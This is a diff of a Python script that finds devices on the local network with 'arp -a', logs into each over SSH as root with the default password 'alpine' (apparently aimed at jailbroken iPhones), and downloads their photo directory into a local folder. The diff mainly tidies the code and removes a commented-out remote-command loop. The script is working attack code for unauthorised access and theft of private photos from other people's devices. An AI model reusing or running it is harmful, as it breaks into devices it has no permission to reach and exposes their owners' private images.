@@ -1,16 +1,12 @@
 import paramiko
-import time
 import subprocess
 import re
 import os
-import sys
-import logging
 
 
 # acquire ip addresses on network
 arpScanResult = str( subprocess.run(['arp', '-a'], stdout=subprocess.PIPE) )
 ipList = re.findall( re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), arpScanResult)
-
 
 USERNAME = 'root'
 PASSWORD = 'alpine'
@@ -27,10 +23,8 @@ client.load_system_host_keys() # is this needed?
 local_dir = 'extracted_photos' #Users/evanknapke2/Desktop/Pics'
 os.path.exists(local_dir) or os.makedirs(local_dir)
 
-
 def progress(transferred, toBeTransferred):
 	print('Progress: {} out of {}'.format(transferred, toBeTransferred))
-
 
 isConnected = False
 
@@ -59,29 +53,11 @@ for ip in ipList:
 					
 					for file in fileList:
 						local_path = os.path.join(local_dir, file)
-						#try:
 						sftp.get(os.path.join(REMOTEPATH, file), local_path, callback=None)
 						print('Downloaded ' + file)
-						#except:
-						#	e = sys.exc_info()[0]
-							#print('Exception: ' + str(e))
-						#	print('Could not download {}. Exception: {}'.format(file, str(e)))
-						#	pass
 					
 				except FileNotFoundError:
 					print('Unable to acces photo directory of %s' % ip)
 					client.close()
-				
-				
-		'''
-		# for testing any command
-		while True:
-			command = input("Type command to run or q to quit: ")
-			if command == "q":
-				break
-			else:
-				(stdin, stdout, stderr) = client.exec_command(command)
-				print( stdout.readlines() )
-		'''
 
 		isConnected = False
